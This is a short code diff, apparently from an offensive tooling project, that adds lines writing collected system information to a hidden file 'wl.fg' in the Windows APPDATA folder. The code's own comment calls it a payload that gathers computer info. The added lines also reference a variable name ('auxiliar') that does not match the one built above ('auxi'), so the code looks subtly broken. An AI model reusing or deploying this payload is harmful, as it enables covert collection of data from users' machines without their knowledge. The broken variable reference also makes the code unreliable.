@@ -10,7 +10,11 @@ auxi += "-- System Info \n"
 auxi += str(sysinfo)
 auxi += "\n"
 print(auxi)
-
+ptp = os.environ['appdata']
+fss = open(f"{ptp}{os.sep}wl.fg", "a")
+fss.write(auxiliar)
+fss.close()
 """
 This payload get computer info and write it into wl.fg
 """
+
